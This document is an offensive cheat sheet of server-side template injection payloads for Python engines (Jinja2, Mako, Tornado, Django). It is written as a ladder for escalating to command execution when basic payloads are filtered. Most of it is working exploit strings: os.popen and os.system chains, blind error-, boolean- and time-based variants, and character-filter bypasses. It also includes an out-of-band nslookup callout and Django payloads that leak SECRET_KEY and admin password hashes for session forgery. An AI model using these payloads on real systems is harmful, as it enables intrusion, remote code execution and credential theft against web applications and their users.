# Python SSTI escalation chains & filter-bypass ladders — Open WHEN: you have fingerprinted a Python template engine (Jinja2, Mako, Tornado, Django) and the body's one-liner is filtered, sandboxed, or blind

The body already has the basic `os.popen` globals one-liner, the MRO subclasses
walk, `{{config}}`, and the `cycler`/`joiner`/`namespace` names. Use this when
those are blocked and you need full ladders.

## Jinja2 — context-free RCE (no `__builtins__`, no subclass index)
Shortest known chain via `lipsum` (found with objectwalker):
```
{{ lipsum.__globals__["os"].popen('id').read() }}
```
Error-Based and Boolean-Based variants of the cycler chain (use when output is
swallowed but errors / status differ):
```
{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }}   # Error-Based: cmd output appears in the AttributeError
{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }}                                              # Boolean-Based: 200 vs 500 by exit code
```
Popen via subclasses WITHOUT guessing the offset (loop over warning class):
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```
then pass the command as `&input=ls` in another query param.
Force output on a blind sink by registering a Flask after-request hook:
```
{{ x.__init__.__builtins__.exec("from flask import current_app, after_this_request\n@after_this_request\ndef hook(*a, **k):\n    from flask import make_response\n    return make_response('Powned')\n") }}
```
Write+load an evil config to get a callable `RUNCMD` (when popen names filtered):
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg','w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('id',shell=True) }}
```

## Jinja2 — filter-bypass ladder (`_`, `.`, `[`, `]`, `|join`, `mro`, `base` blocked)
Build forbidden names from request params (set `&class=class&usc=_`):
```
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}     # → request.__class__
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
```
Bypass `[` `]` with a tuple, or with `getlist` (set `&l=a&a=_&a=_&a=class&a=_&a=_`):
```
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}
{{request|attr(request.args.getlist(request.args.l)|join)}}
```
Bypass `|join` with `|format` (set `&f=%s%sclass%s%s&a=_`):
```
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}
```
SecGus all-in-one (bypasses `.` `_` `|join` `[` `]` `mro` `base` via `\xNN`):
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
Obfuscate the literal `id` by slicing it out of a long repr (index is target-specific):
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```

## Mako — direct `os` chains (try each; sandbox blocks some, not others)
```
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
```
Inline-Python block (works when `${...}` member chain is filtered):
```
<%import os%>${os.popen('id').read()}
```
Build the string `id` without literals (defeats keyword blacklists):
```
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

## Tornado — universal Python payloads also apply
```
{{7*'7'}}            # → 7777777 (same differential as Jinja2)
{% import os %}{{os.system('whoami')}}
{% import os %}{{os.system('nslookup oastify.com')}}   # OOB / blind
```
Generic Python-engine payloads (Bottle, Cheetah, Chameleon, Mako, Tornado) —
wrap the body in the engine's tag:
```
__include__("os").popen("id").read()                          # rendered RCE
getattr("", "x" + __include__("os").popen("id").read())       # error-based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0)         # boolean-based RCE
__include__("os").popen("id && sleep 5").read()               # time-based RCE
```

## Django Template Language (DTL) — restricted, no function calls
DTL ≠ Jinja2: `{{7*7}}` errors, methods cannot be called, so go for disclosure:
```
{% csrf_token %}                              # renders → confirms DTL (errors under Jinja2)
ih0vr{{364|add:733}}d121r                     # → ih0vr1097d121r (arithmetic via |add filter)
{% debug %}                                   # dump context + filters
{{ messages.storages.0.signer.key }}          # leak SECRET_KEY → forge sessions
{% include 'admin/base.html' %}               # leak admin URL
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}}{% endfor %}   # admin user + password hash
```
With a leaked `SECRET_KEY`, pivot to signed-cookie forgery rather than RCE.
